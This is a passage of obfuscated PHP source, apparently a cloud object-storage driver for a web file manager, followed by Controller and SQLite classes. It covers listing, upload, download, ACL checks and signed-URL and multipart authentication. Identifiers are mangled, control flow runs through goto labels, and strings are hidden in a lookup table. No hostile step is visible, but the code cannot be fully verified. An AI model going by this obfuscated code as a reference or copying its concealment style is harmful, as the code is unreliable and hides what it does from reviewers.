delByBatch($b†î¯˜âŠ©) { foreach (array_chunk($b†î¯˜âŠ©, 1000) as $f™±„æ®´Š) { $Fˆƒì–´í˜ = $this->client->deleteObjects($this->bucket, $f™±„æ®´Š); if (!$Fˆƒì–´í˜) { return !1; } } return !0; } public function rename($BŠÂÏ‰ÀÁ, $f¶ÆÍ¨Ó†·) { return $this->renameObject($BŠÂÏ‰ÀÁ, $f¶ÆÍ¨Ó†·); } public function listPath($a˜ñè°¯¤Ğ, $bšÂÉåÓâ» = false) { $cöµ˜Ñ»Ë÷ =& $_SERVER[¢ÌÛ]; $B•‹Êªß¼ = $this->fileList($a˜ñè°¯¤Ğ, $cöµ˜Ñ»Ë÷[8], !0); foreach ($B•‹Êªß¼[$cöµ˜Ñ»Ë÷[74]] as $eĞ™¡ùÖøŠ => $F –òÖ“) { $B•‹Êªß¼[$cöµ˜Ñ»Ë÷[74]][$eĞ™¡ùÖøŠ] = $this->folderInfo($F –òÖ“, $bšÂÉåÓâ»); } foreach ($B•‹Êªß¼[$cöµ˜Ñ»Ë÷[73]] as $eĞ™¡ùÖøŠ => $F –òÖ“) { $B•‹Êªß¼[$cöµ˜Ñ»Ë÷[73]][$eĞ™¡ùÖøŠ] = $this->fileInfo($F –òÖ“[$cöµ˜Ñ»Ë÷[28]], $bšÂÉåÓâ», $F –òÖ“); } return $B•‹Êªß¼; } private function fileInfo($c½õŞ–ˆé, $DÍƒ»””½ª = false, $A±í¡„ë¡ = array()) { goto b¿§ƒÃ; aàºÒ÷æ¿: $F¶ï‡ë—Ô…[$Dè×øçõ¢Æ[192]] = $F¶ï‡ë—Ô…[$Dè×øçõ¢Æ[83]] = 0; $F¶ï‡ë—Ô…[$Dè×øçõ¢Æ[193]] = $F¶ï‡ë—Ô…[$Dè×øçõ¢Æ[194]] = !0; if (empty($A±í¡„ë¡)) { $A±í¡„ë¡ = $this->objectMeta($c½õŞ–ˆé); if (!$A±í¡„ë¡) { return $F¶ï‡ë—Ô…; } } goto bĞß‹»™; b¿§ƒÃ: $Dè×øçõ¢Æ =& $_SERVER[¢ÌÛ]; $F¶ï‡ë—Ô… = array($Dè×øçõ¢Æ[28] => $this->pathThis($c½õŞ–ˆé), $Dè×øçõ¢Æ[75] => $this->getPathOuter($c½õŞ–ˆé), $Dè×øçõ¢Æ[29] => $Dè×øçõ¢Æ[173], $Dè×øçõ¢Æ[167] => $this->ext($c½õŞ–ˆé), $Dè×øçõ¢Æ[77] => isset($A±í¡„ë¡[$Dè×øçõ¢Æ[77]]) ? $A±í¡„ë¡[$Dè×øçõ¢Æ[77]] : 0); if ($DÍƒ»””½ª) { return $F¶ï‡ë—Ô…; } goto aàºÒ÷æ¿; bĞß‹»™: if (isset($A±í¡„ë¡[$Dè×øçõ¢Æ[195]])) { $F¶ï‡ë—Ô…[$Dè×øçõ¢Æ[83]] = $A±í¡„ë¡[$Dè×øçõ¢Æ[195]]; } if (isset($A±í¡„ë¡[$Dè×øçõ¢Æ[77]])) { $F¶ï‡ë—Ô…[$Dè×øçõ¢Æ[77]] = $A±í¡„ë¡[$Dè×øçõ¢Æ[77]]; } return $F¶ï‡ë—Ô…; goto AÌî³ã½ë£; AÌî³ã½ë£: } private function folderInfo($b¹°Ç“ŠÙª, $dŒ‹ò¼«£÷ = false) { goto F¤âì¡ôŒ‘; CÎ—¢Óİ±Ç: $b¹°Ç“ŠÙª = trim($b¹°Ç“ŠÙª, $fñàëÃÉä–[8]) . $fñàëÃÉä–[8]; $F¾…Ì®Ë‚ = $this->objectMeta($b¹°Ç“ŠÙª); if (isset($F¾…Ì®Ë‚[$fñàëÃÉä–[195]])) { $B¿ˆ¯‡°¤[$fñàëÃÉä–[192]] = $F¾…Ì®Ë‚[$fñàëÃÉä–[195]]; } goto EÏ¤ÚÓÚî¶; EÏ¤ÚÓÚî¶: return $B¿ˆ¯‡°¤; goto d¥¤Ôˆ½ÀÂ; B´Šˆ‡¥öë: $B¿ˆ¯‡°¤[$fñàëÃÉä–[192]] = $B¿ˆ¯‡°¤[$fñàëÃÉä–[83]] = 0; $B¿ˆ¯‡°¤[$fñàëÃÉä–[193]] = $B¿ˆ¯‡°¤[$fñàëÃÉä–[194]] = !0; if ($b¹°Ç“ŠÙª == $fñàëÃÉä–[33]) { return $B¿ˆ¯‡°¤; } goto CÎ—¢Óİ±Ç; F¤âì¡ôŒ‘: $fñàëÃÉä– =& $_SERVER[¢ÌÛ]; $B¿ˆ¯‡°¤ = array($fñàëÃÉä–[28] => $this->pathThis($b¹°Ç“ŠÙª), $fñàëÃÉä–[75] => $this->getPathOuter($fñàëÃÉä–[8] . $b¹°Ç“ŠÙª), $fñàëÃÉä–[29] => $fñàëÃÉä–[76]); if ($dŒ‹ò¼«£÷) { return $B¿ˆ¯‡°¤; } goto B´Šˆ‡¥öë; d¥¤Ôˆ½ÀÂ: } private function fileList($b³Ìò ˜œ, $BóÛ¿î…ñ = '', $CŒõ©„ †œ = 0) { goto fö‰Êâ¹„; D¢§†…ñâø: foreach ($dÚ™Ù¿õáÏ[$F¢¨Œ¸°Š‡[196]] as $CÓÕŠ§¤µ) { goto aŠ„ƒŠˆ©; C«Ñ«¸£Ş: $bù·‡¨Ê[] = $CŒõ©„ †œ ? $CÓÕŠ§¤µ : $f…ó£ğë; goto A”ÈßŠèØ; cãÉî¢‹î”: $C­†¥™×•È = $eÊñ’‘˜‡“ == 0 && substr($f…ó£ğë, strlen($f…ó£ğë) - 1, 1) == $F¢¨Œ¸°Š‡[8] ? !0 : !1; if ($Aõê´ìâí) { $this->cacheMethod($F¢¨Œ¸°Š‡[197], $f…ó£ğë, $C­†¥™×•È); $this->cacheMethod($F¢¨Œ¸°Š‡[198], $f…ó£ğë, $CÓÕŠ§¤µ); } if ($C­†¥™×•È) { $aóôîƒòŒ‚[] = $f…ó£ğë; continue; } goto C«Ñ«¸£Ş; aŠ„ƒŠˆ©: $f…ó£ğë = $CÓÕŠ§¤µ[$F¢¨Œ¸°Š‡[28]]; if ($f…ó£ğë == $f§¡ãĞì) { continue; } $eÊñ’‘˜‡“ = isset($CÓÕŠ§¤µ[$F¢¨Œ¸°Š‡[77]]) ? $CÓÕŠ§¤µ[$F¢¨Œ¸°Š‡[77]] : 0; goto cãÉî¢‹î”; A”ÈßŠèØ: } foreach ($dÚ™Ù¿õáÏ[$F¢¨Œ¸°Š‡[199]] as $CÓÕŠ§¤µ) { $aóôîƒòŒ‚[] = $CÓÕŠ§¤µ[$F¢¨Œ¸°Š‡[28]]; if ($Aõê´ìâí) { $this->cacheMethod($F¢¨Œ¸°Š‡[197], $CÓÕŠ§¤µ[$F¢¨Œ¸°Š‡[28]], !0); } } if ($Aõê´ìâí) { $this->cacheMethod($F¢¨Œ¸°Š‡[197], $b³Ìò ˜œ, !0); } goto CŒ…ïáÒè; fö‰Êâ¹„: $F¢¨Œ¸°Š‡ =& $_SERVER[¢ÌÛ]; $f§¡ãĞì = rtrim($b³Ìò ˜œ, $F¢¨Œ¸°Š‡[8]) . $F¢¨Œ¸°Š‡[8]; $dÚ™Ù¿õáÏ = $this->listObjs($f§¡ãĞì, null, null, $BóÛ¿î…ñ); goto FµğßÄƒÓÙ; FµğßÄƒÓÙ: if (!$dÚ™Ù¿õáÏ) { return array($F¢¨Œ¸°Š‡[74] => array(), $F¢¨Œ¸°Š‡[73] => array()); } $Aõê´ìâí = $this->listItemCache === !1 ? !1 : !0; $aóôîƒòŒ‚ = $bù·‡¨Ê = array(); goto D¢§†…ñâø; CŒ…ïáÒè: return array($F¢¨Œ¸°Š‡[74] => $aóôîƒòŒ‚, $F¢¨Œ¸°Š‡[73] => $bù·‡¨Ê); goto F‰ê ÂŒ; F‰ê ÂŒ: } private function listObjs($CËå¡Ñ˜Æ, $f›‰ëï¿Ê = null, $dÜ—ñ¨Éì = null, $Cøìù–í¦Ã = null) { $AÖ›¬°Úî =& $_SERVER[¢ÌÛ]; $CËå¡Ñ˜Æ = trim($CËå¡Ñ˜Æ, $AÖ›¬°Úî[8]); $D“Ÿ¸°³è = empty($CËå¡Ñ˜Æ) ? $AÖ›¬°Úî[33] : $CËå¡Ñ˜Æ . $AÖ›¬°Úî[8]; return $this->client->getBucket($this->bucket, $D“Ÿ¸°³è, $f›‰ëï¿Ê, $dÜ—ñ¨Éì, $Cøìù–í¦Ã, !0); } public function has($A‡„††¤ùÏ, $F­çõ‘ïœ = false, $B›Ä¸°Àƒˆ = true) { goto Bœ†•Ùß¡Æ; a™ôÌÅÆì: return !1; goto F¯¥ñ°¡ì…; Bœ†•Ùß¡Æ: $d¢¨ˆ¹äÜÔ =& $_SERVER[¢ÌÛ]; $A‡„††¤ùÏ = trim($A‡„††¤ùÏ, $d¢¨ˆ¹äÜÔ[8]); $E­ãÊê = empty($A‡„††¤ùÏ) ? $d¢¨ˆ¹äÜÔ[33] : $A‡„††¤ùÏ . $d¢¨ˆ¹äÜÔ[8]; goto A­¡äË§½; c¾šã”˜Ş: $c°İë­³Û = $AÃƒæáŸµº = array(); while (!0) { $aÅ…ŒÚì ğ = $this->listObjs($A‡„††¤ùÏ, $C…™÷æˆŠ, $DŒ›ÍùŒ, $fïõä¬‡±À); if (!$aÅ…ŒÚì ğ) { break; } $C…™÷æˆŠ = $aÅ…ŒÚì ğ[$d¢¨ˆ¹äÜÔ[200]]; $dÛÈÜÁĞ¢Õ = $aÅ…ŒÚì ğ[$d¢¨ˆ¹äÜÔ[196]]; $BŸå¬…ó³ = $aÅ…ŒÚì ğ[$d¢¨ˆ¹äÜÔ[199]]; if (empty($dÛÈÜÁĞ¢Õ) && empty($BŸå¬…ó³)) { break; } if (count($dÛÈÜÁĞ¢Õ) == 1 && $dÛÈÜÁĞ¢Õ[0][$d¢¨ˆ¹äÜÔ[28]] == $E­ãÊê) { break; } if ($F­çõ‘ïœ) { if (count($dÛÈÜÁĞ¢Õ)) { $dÛÈÜÁĞ¢Õ = array_column($dÛÈÜÁĞ¢Õ, $d¢¨ˆ¹äÜÔ[28]); $c°İë­³Û = array_merge($c°İë­³Û, $dÛÈÜÁĞ¢Õ); } if (count($BŸå¬…ó³)) { $BŸå¬…ó³ = array_column($BŸå¬…ó³, $d¢¨ˆ¹äÜÔ[28]); $AÃƒæáŸµº = array_merge($AÃƒæáŸµº, $BŸå¬…ó³); } if ($C…™÷æˆŠ === null) { break; } continue; } if ($B›Ä¸°Àƒˆ) { if (!empty($dÛÈÜÁĞ¢Õ)) { if (count($dÛÈÜÁĞ¢Õ) > 1 || isset($dÛÈÜÁĞ¢Õ[0][$d¢¨ˆ¹äÜÔ[28]]) && $dÛÈÜÁĞ¢Õ[0][$d¢¨ˆ¹äÜÔ[28]] != $E­ãÊê) { return !0; } } } else { if (!empty($BŸå¬…ó³)) { return !0; } } if ($C…™÷æˆŠ === null) { break; } } if ($F­çõ‘ïœ) { $c°İë­³Û = array_diff($c°İë­³Û, array($E­ãÊê)); $c°İë­³Û = count(array_unique($c°İë­³Û)); $AÃƒæáŸµº = count(array_unique($AÃƒæáŸµº)); return array($d¢¨ˆ¹äÜÔ[201] => $c°İë­³Û, $d¢¨ˆ¹äÜÔ[202] => $AÃƒæáŸµº); } goto a™ôÌÅÆì; A­¡äË§½: $C…™÷æˆŠ = null; $DŒ›ÍùŒ = 500; $fïõä¬‡±À = $d¢¨ˆ¹äÜÔ[8]; goto c¾šã”˜Ş; F¯¥ñ°¡ì…: } public function listAll($A·ç©’õÖ) { $E•ÏÉ³„„Ğ =& $_SERVER[¢ÌÛ]; $fËĞª›äÚ½ = $this->fileList($A·ç©’õÖ, $E•ÏÉ³„„Ğ[33], !0); $cë½œ®ø”ô = array(); foreach ($fËĞª›äÚ½[$E•ÏÉ³„„Ğ[73]] as $a¶Õ­‡÷ò¦) { $cë½œ®ø”ô[$a¶Õ­‡÷ò¦[$E•ÏÉ³„„Ğ[28]]] = $a¶Õ­‡÷ò¦[$E•ÏÉ³„„Ğ[77]]; } foreach ($fËĞª›äÚ½[$E•ÏÉ³„„Ğ[74]] as $a¶Õ­‡÷ò¦) { if (is_string($a¶Õ­‡÷ò¦)) { $cë½œ®ø”ô[$a¶Õ­‡÷ò¦] = 0; } } return $this->listAllFiles($A·ç©’õÖ, array_keys($cë½œ®ø”ô), $cë½œ®ø”ô); } public function canRead($DñõÏæËÈ›) { $AÚáĞ›ïïí =& $_SERVER[¢ÌÛ]; $F»¤Á¾¦§¼ = $this->client->getAccessControlPolicy($this->bucket, $DñõÏæËÈ›); if (!$F»¤Á¾¦§¼) { return !1; } return in_array($F»¤Á¾¦§¼, array($AÚáĞ›ïïí[203], $AÚáĞ›ïïí[204], $AÚáĞ›ïïí[205])) ? !0 : !1; } public function canWrite($c°Şõã‚äñ) { $CíøÂÜ‘•ñ =& $_SERVER[¢ÌÛ]; $dÎø‰­¯·† = $this->client->getAccessControlPolicy($this->bucket, $c°Şõã‚äñ); if (!$dÎø‰­¯·†) { return !1; } return in_array($dÎø‰­¯·†, array($CíøÂÜ‘•ñ[203], $CíøÂÜ‘•ñ[204])) ? !0 : !1; } public function getContent($eÑâòĞÇ™) { return $this->client->getObject($this->bucket, $eÑâòĞÇ™); } public function setContent($Aàî‹Š‡ğ½, $bá“ªò÷’Ä = '', $DöŞÕ¥ğÀÂ = false) { goto A›ÎæÓø”Æ; A›ÎæÓø”Æ: $FâÆñ‡Äª× =& $_SERVER[¢ÌÛ]; $Aàî‹Š‡ğ½ = $DöŞÕ¥ğÀÂ ? trim($Aàî‹Š‡ğ½, $FâÆñ‡Äª×[8]) . $FâÆñ‡Äª×[8] : $Aàî‹Š‡ğ½; $Aª«£İµÍÂ = get_file_mime(get_path_ext($Aàî‹Š‡ğ½)); goto FÙáŠĞ×; e™ˆãÚ…•°: $this->cacheMethod(null, null); $aáàëâÑóÅ = $this->copyFile($Aàî‹Š‡ğ½, $Aàî‹Š‡ğ½, array($FâÆñ‡Äª×[206] => $aáàëâÑóÅ[$FâÆñ‡Äª×[207]])); return $aáàëâÑóÅ ? !0 : !1; goto BïãœŠ‚²Ù; FÙáŠĞ×: $aáàëâÑóÅ = $this->client->putObject($bá“ªò÷’Ä, $this->bucket, $Aàî‹Š‡ğ½, $FâÆñ‡Äª×[191], array(), $Aª«£İµÍÂ); if (!$aáàëâÑóÅ) { return !1; } if ($DöŞÕ¥ğÀÂ) { return !0; } goto e™ˆãÚ…•°; BïãœŠ‚²Ù: } public function fileSubstr($F·ªŞ°ÖĞë, $E¤¾ó˜œÙ, $b¼æ’”í·Ò) { $cÑóÌ‚ÅŠ  = $E¤¾ó˜œÙ + $b¼æ’”í·Ò - 1; return $this->client->getObject($this->bucket, $F·ªŞ°ÖĞë, array($_SERVER[¢ÌÛ][208] => "\x62\x79\x74\x65\163\x3d{$E¤¾ó˜œÙ}\55{$cÑóÌ‚ÅŠ }")); } public function upload($e©½Ì„Ğâ, $C…ÃŒæ¹£ˆ, $Aİš›‚”¸¨ = false, $bš¾—‰ÉÅ¥ = REPEAT_REPLACE) { $DØïÈ¿±è =& $_SERVER[¢ÌÛ]; $c½°ÚÕ…¨â = array($DØïÈ¿±è[206] => @md5_file($C…ÃŒæ¹£ˆ)); $F­Ô¢…Ù² = array($DØïÈ¿±è[209] => get_file_mime(get_path_ext($e©½Ì„Ğâ))); if (IO::size($C…ÃŒæ¹£ˆ) <= 1024 * 1024 * 200) { $A±°ªÂĞ¾ğ = $this->client->putObjectFile($C…ÃŒæ¹£ˆ, $this->bucket, $e©½Ì„Ğâ, $DØïÈ¿±è[191], $c½°ÚÕ…¨â, $F­Ô¢…Ù²); return !empty($A±°ªÂĞ¾ğ) ? $this->getPathOuter($e©½Ì„Ğâ) : !1; } $d š–°†œ¾ = $this->client->multiUploadObject($C…ÃŒæ¹£ˆ, $this->bucket, trim($e©½Ì„Ğâ, $DØïÈ¿±è[8]), $c½°ÚÕ…¨â, $F­Ô¢…Ù²); return $d š–°†œ¾ ? $this->getPathOuter($e©½Ì„Ğâ) : !1; } public function download($A×¶“Ãö›Ö, $aÃ®‘ä¼Éª) { if (!@is_dir($this->pathFather($aÃ®‘ä¼Éª)) && !IO::mkdir($this->pathFather($aÃ®‘ä¼Éª))) { return !1; } $e¯Á‡İÒä„ = $this->client->getObject($this->bucket, $A×¶“Ãö›Ö, array(), $aÃ®‘ä¼Éª); return $e¯Á‡İÒä„ !== !1 ? $aÃ®‘ä¼Éª : !1; } public function link($FÛÚ¾ÓÔ¸, $DÆá‘«öñ = array()) { $B²ÃÂÚ´”ª =& $_SERVER[¢ÌÛ]; if ($this->signVer == $B²ÃÂÚ´”ª[210]) { return $this->client->getAuthenticatedURL($this->bucket, $FÛÚ¾ÓÔ¸, 3600 * 12, $DÆá‘«öñ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($FÛÚ¾ÓÔ¸, $B²ÃÂÚ´”ª[8]), 3600 * 12, $this->region, array(), !0, $DÆá‘«öñ); } public function fileOut($C¼¼–ó„, $Díƒøäâ„õ = false, $e²¨™Í“ˆ¡ = false, $dî‡°‡†›µ = '') { goto d§³ìÍï³; d§³ìÍï³: $D¤Ä¯ÌÆñ¬ =& $_SERVER[¢ÌÛ]; if ($this->isFileOutServer()) { return $this->fileOutServer($C¼¼–ó„, $Díƒøäâ„õ, $e²¨™Í“ˆ¡, $dî‡°‡†›µ); } if (!$e²¨™Í“ˆ¡) { $e²¨™Í“ˆ¡ = $this->pathThis($C¼¼–ó„); } goto aë¢å‡¿¾; bÃ™¥áÛ¨: $a–±•ñÙ = array($D¤Ä¯ÌÆñ¬[214] => $Díƒøäâ„õ . $D¤Ä¯ÌÆñ¬[215] . rawurlencode($e²¨™Í“ˆ¡), $D¤Ä¯ÌÆñ¬[216] => $aÜÎ§¢ìÕÊ); $a Á‘£ÉÍ = $this->link($C¼¼–ó„, $a–±•ñÙ); $this->fileOutLink($a Á‘£ÉÍ); goto AùáŒ‘µ©Ï; aë¢å‡¿¾: $aÜÎ§¢ìÕÊ = get_file_mime(get_path_ext($e²¨™Í“ˆ¡)); if ($aÜÎ§¢ìÕÊ == $D¤Ä¯ÌÆñ¬[211]) { return parent::fileOut($C¼¼–ó„, $Díƒøäâ„õ, $e²¨™Í“ˆ¡, $dî‡°‡†›µ); } $Díƒøäâ„õ = $Díƒøäâ„õ ? $D¤Ä¯ÌÆñ¬[212] : $D¤Ä¯ÌÆñ¬[213]; goto bÃ™¥áÛ¨; AùáŒ‘µ©Ï: } public function fileOutServer($F®‹¯¸„±¬, $BÁã‚¨Ì° = false, $DÂáà°Ìëë = false, $f¡Êë‚ĞÜÎ = '') { parent::fileOut($F®‹¯¸„±¬, $BÁã‚¨Ì°, $DÂáà°Ìëë, $f¡Êë‚ĞÜÎ); } public function fileOutImageServer($bé‰¦Œ»©ñ, $Dèî‡äõÄ´ = 250) { parent::fileOutImage($bé‰¦Œ»©ñ, $Dèî‡äõÄ´); } public function hashMd5($fÏÜ„Ä²¦Ò, $A†Öà¾æ¾º = '') { $BëÖŒˆîğ¢ =& $_SERVER[¢ÌÛ]; $EëìæÇ¸æ = $this->objectMeta($fÏÜ„Ä²¦Ò); if (!$EëìæÇ¸æ) { return !1; } $A†Öà¾æ¾º = $A†Öà¾æ¾º ? $A†Öà¾æ¾º : _get($EëìæÇ¸æ, $BëÖŒˆîğ¢[217]); $A†Öà¾æ¾º = $A†Öà¾æ¾º ? $A†Öà¾æ¾º : _get($EëìæÇ¸æ, $BëÖŒˆîğ¢[207], $BëÖŒˆîğ¢[33]); return $A†Öà¾æ¾º; } public function uploadFormData($BÜõãß²Üİ, $eğƒÜíÅŸ¨ = 3600) { $AÏ´ôëë‚å =& $_SERVER[¢ÌÛ]; $Eœšôœğ‡¤ = $this->pathFather($BÜõãß²Üİ); $bßâ¥è“™˜ = $this->client->getHttpUploadPostParams($this->bucket, $Eœšôœğ‡¤, $AÏ´ôëë‚å[191], $eğƒÜíÅŸ¨); return array_merge((array) $bßâ¥è“™˜, array($AÏ´ôëë‚å[175] => $this->getHost())); } public function multiUploadFormData($FÄ’ß”ª†, $EëØ£—¡·‚ = 3600) { $a“£¦µ‰¥¢ =& $_SERVER[¢ÌÛ]; $d°œ­Å´¢é = gmdate($a“£¦µ‰¥¢[218]); $CÃöîŒˆÇ = array(); $EöÙ¥‚×ßÖ = $this->client->getUploadId($this->bucket, $FÄ’ß”ª†, $CÃöîŒˆÇ); if (!$EöÙ¥‚×ßÖ) { return !1; } return array($a“£¦µ‰¥¢[219] => $EöÙ¥‚×ßÖ, $a“£¦µ‰¥¢[175] => $this->getHost() . $a“£¦µ‰¥¢[8] . $this->pathEncode($FÄ’ß”ª†), $a“£¦µ‰¥¢[220] => $d°œ­Å´¢é, $a“£¦µ‰¥¢[92] => $FÄ’ß”ª†); } public function multiUploadAuthData($f–§÷Í­›Ô, $Däôš¼×ö¬ = array()) { goto aµ½ñŸªĞ‡; C¬šÇ„ªÃØ: $Fê™‡™˜ì = $Däôš¼×ö¬[$fÏèäˆÂ[92]]; unset($Däôš¼×ö¬[$fÏèäˆÂ[92]]); if (isset($Däôš¼×ö¬[$fÏèäˆÂ[221]])) { $Däôš¼×ö¬[$fÏèäˆÂ[220]] = $bœ‹ ğßèé; return $this->listUploadParts($Fê™‡™˜ì, $Däôš¼×ö¬); } goto Aæ‰Ç‹£¨ò; e‰æ³Üäğ£: $CÔæ‚âù×© = implode($fÏèäˆÂ[227], $c¥…Éöà); $AÔ‡ùã…× = base64_encode(hash_hmac($fÏèäˆÂ[228], $CÔæ‚âù×©, $this->secret, !0)); $dƒ˜Ê½•˜¯ = $fÏèäˆÂ[229] . $this->accessKey . $fÏèäˆÂ[4] . $AÔ‡ùã…×; goto EÄ½ß›Âàô; aµ½ñŸªĞ‡: $fÏèäˆÂ =& $_SERVER[¢ÌÛ]; $bœ‹ ğßèé = isset($Däôš¼×ö¬[$fÏèäˆÂ[220]]) ? $Däôš¼×ö¬[$fÏèäˆÂ[220]] : gmdate($fÏèäˆÂ[218]); $eÂÆ—Ó‚ËÇ = isset($Däôš¼×ö¬[$fÏèäˆÂ[167]]) ? $Däôš¼×ö¬[$fÏèäˆÂ[167]] : $fÏèäˆÂ[33]; goto C¬šÇ„ªÃØ; EÄ½ß›Âàô: if (strpos($eÂÆ—Ó‚ËÇ, $fÏèäˆÂ[223]) === 0) { return array($fÏèäˆÂ[230] => $dƒ˜Ê½•˜¯, $fÏèäˆÂ[220] => $bœ‹ ğßèé); } return $dƒ˜Ê½•˜¯; goto b…Éí‡ãèÍ; Aæ‰Ç‹£¨ò: $c¥…Éöà = array($fÏèäˆÂ[222], $fÏèäˆÂ[33], $fÏèäˆÂ[118], $fÏèäˆÂ[33], "\x78\55\141\155\172\x2d\144\x61\x74\x65\72{$bœ‹ ğßèé}", $fÏèäˆÂ[8] . $this->bucket . $fÏèäˆÂ[8] . $this->pathEncode($Fê™‡™˜ì) . $eÂÆ—Ó‚ËÇ); if (strpos($eÂÆ—Ó‚ËÇ, $fÏèäˆÂ[223]) === 0) { $c¥…Éöà[0] = $fÏèäˆÂ[224]; } if (isset($Däôš¼×ö¬[$fÏèäˆÂ[225]]) && $Däôš¼×ö¬[$fÏèäˆÂ[225]] == $fÏèäˆÂ[226]) { $c¥…Éöà[0] = $fÏèäˆÂ[226]; } goto e‰æ³Üäğ£; b…Éí‡ãèÍ: } public function listUploadParts($fÎ†§¼‡·ó, $a‰õˆ¿Ä¸µ = array()) { goto cëĞåá£È›; cê–·ñĞõ§: if (!$cã‰ˆ¯Óä¾) { return !1; } unset($a‰õˆ¿Ä¸µ[$CÈğ¡×®ã’[221]], $a‰õˆ¿Ä¸µ[$CÈğ¡×®ã’[225]]); $a‰õˆ¿Ä¸µ[$CÈğ¡×®ã’[92]] = $fÎ†§¼‡·ó; goto eìÃ¥öåÛÒ; cëĞåá£È›: $CÈğ¡×®ã’ =& $_SERVER[¢ÌÛ]; $eÒƒ„…Ü±Ó = str_replace($CÈğ¡×®ã’[231], $CÈğ¡×®ã’[33], $a‰õˆ¿Ä¸µ[$CÈğ¡×®ã’[167]]); $cã‰ˆ¯Óä¾ = $this->client->listParts($this->bucket, $fÎ†§¼‡·ó, $eÒƒ„…Ü±Ó); goto cê–·ñĞõ§; eìÃ¥öåÛÒ: $F…ôöç»ƒò = $this->multiUploadAuthData($fÎ†§¼‡·ó, $a‰õˆ¿Ä¸µ); if (empty($F…ôöç»ƒò)) { return !1; } return array($CÈğ¡×®ã’[230] => $F…ôöç»ƒò, $CÈğ¡×®ã’[220] => $a‰õˆ¿Ä¸µ[$CÈğ¡×®ã’[220]], $CÈğ¡×®ã’[232] => $cã‰ˆ¯Óä¾); goto D²¤“Ù¦Œ¿; D²¤“Ù¦Œ¿: } public function getHost() { return parent::getHost() . $_SERVER[¢ÌÛ][8] . $this->bucket; } public function size($eêÎéÏô) { $d÷Å¼ßÖ‡ˆ = $this->objectMeta($eêÎéÏô); return $d÷Å¼ßÖ‡ˆ ? $d÷Å¼ßÖ‡ˆ[$_SERVER[¢ÌÛ][77]] : 0; } public function info($c…‹ËÁË±) { if ($this->isFolder($c…‹ËÁË±)) { return $this->folderInfo($c…‹ËÁË±); } else { if ($this->isFile($c…‹ËÁË±)) { return $this->fileInfo($c…‹ËÁË±); } } return !1; } public function exist($Dº¯Çğ±õ) { return $this->isFile($Dº¯Çğ±õ) || $this->isFolder($Dº¯Çğ±õ); } public function isFile($Bèã¨ƒ‹ã) { return !$this->isFolder($Bèã¨ƒ‹ã) && $this->objectMeta($Bèã¨ƒ‹ã); } public function isFolder($D±Û±ˆ¯´„) { return $this->cacheMethod($_SERVER[¢ÌÛ][197], $D±Û±ˆ¯´„); } protected function objectMeta($eô‰Ä¥®á®) { return $this->cacheMethod($_SERVER[¢ÌÛ][198], $eô‰Ä¥®á®); } protected function _objectMeta($E®ÏÅØùé) { $dŠŒßØƒÇ± =& $_SERVER[¢ÌÛ]; $E®ÏÅØùé = rtrim($E®ÏÅØùé, $dŠŒßØƒÇ±[8]); try { $DÕªŸ¼Š = $this->client->getObjectInfo($this->bucket, $E®ÏÅØùé); if (!isset($DÕªŸ¼Š[$dŠŒßØƒÇ±[217]]) && isset($DÕªŸ¼Š[$dŠŒßØƒÇ±[233]])) { $DÕªŸ¼Š[$dŠŒßØƒÇ±[217]] = $DÕªŸ¼Š[$dŠŒßØƒÇ±[233]]; } } catch (Exception $BƒŞ”ÉæŠÃ) { $DÕªŸ¼Š = !1; } if (!$DÕªŸ¼Š) { } return $DÕªŸ¼Š; } protected function _isFolder($Eå„Á©á¬) { goto DŒ¯¬å; DŒ¯¬å: $dôŠŸ…ñ‰‰ =& $_SERVER[¢ÌÛ]; $Eå„Á©á¬ = rtrim($Eå„Á©á¬, $dôŠŸ…ñ‰‰[8]); if ($Eå„Á©á¬ == $dôŠŸ…ñ‰‰[33] || $Eå„Á©á¬ == $dôŠŸ…ñ‰‰[8]) { return !0; } goto D¬ËÕ„áî; D¬ËÕ„áî: $Fì’æ¸Ú = $this->client->getBucket($this->bucket, $Eå„Á©á¬, null, 1); if (empty($Fì’æ¸Ú[$dôŠŸ…ñ‰‰[196]])) { return !1; } $F½ìÀ¨ÕÆÛ = $Fì’æ¸Ú[$dôŠŸ…ñ‰‰[196]][0][$dôŠŸ…ñ‰‰[28]]; goto Aá‡†¦Ü¢¥; Aá‡†¦Ü¢¥: if (substr($F½ìÀ¨ÕÆÛ, -1) == $dôŠŸ…ñ‰‰[8]) { return !0; } if (get_path_this($F½ìÀ¨ÕÆÛ) == get_path_this($Eå„Á©á¬)) { return !1; } return !0; goto còÄ•±»Ã†; còÄ•±»Ã†: } } define($_SERVER[¢ÌÛ][234], 1); goto bïæ£âÍ²ù; e‚½„„‹Œ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto b£Ë°âØëÓ; b²ùÃìö›µ: $this->in =& $in; $this->values[$aµšÏÑËƒ[6]] =& $config; $this->values[$aµšÏÑËƒ[7]] =& $in; goto c¤¦˜ˆ˜‚Õ; c¤¦˜ˆ˜‚Õ: $this->tpl = TEMPLATE . MOD . $aµšÏÑËƒ[8]; $this->_classObjectID = mt_rand(0, 10000); goto F†™ÃŠ¦À; b£Ë°âØëÓ: $aµšÏÑËƒ =& $_SERVER[¢ÌÛ]; global $in, $config; $this->config =& $config; goto b²ùÃìö›µ; F†™ÃŠ¦À: } public function loadClass($aé…’ç¬ÎÚ) { if (1 === func_num_args()) { $this->{$aé…’ç¬ÎÚ} = new $aé…’ç¬ÎÚ(); } else { $féœàšÓô = new ReflectionClass($aé…’ç¬ÎÚ); $C—ƒ¦ÔØ ê = func_get_args(); array_shift($C—ƒ¦ÔØ ê); $this->{$aé…’ç¬ÎÚ} = $féœàšÓô->newInstanceArgs($C—ƒ¦ÔØ ê); } return $this->{$aé…’ç¬ÎÚ}; } protected function assign($c‰§Ñ®ˆÌ, $fŞŒÙğ´ ) { $this->values[$c‰§Ñ®ˆÌ] = $fŞŒÙğ´ ; } protected function display($eëî¶ÕÀ¡¨) { ob_end_clean(); extract($this->values); require $this->tpl . $eëî¶ÕÀ¡¨; } } class DbSqliteBase extends Db { public function __construct($eéó‚Ê‚ = '') { $C¦Ÿ©ñ—šˆ =& $_SERVER[¢ÌÛ]; if (!extension_loaded($C¦Ÿ©ñ—šˆ[9])) { think_exception(think_lang($C¦Ÿ©ñ—šˆ[10]) . $C¦Ÿ©ñ—šˆ[11]); } if (!empty($eéó‚Ê‚)) { if (!isset($eéó‚Ê‚[$C¦Ÿ©ñ—šˆ[12]])) { $eéó‚Ê‚[$C¦Ÿ©ñ—šˆ[12]] = 438; } $this->config = $eéó‚Ê‚; if (empty($this->config[$C¦Ÿ©ñ—šˆ[13]])) { 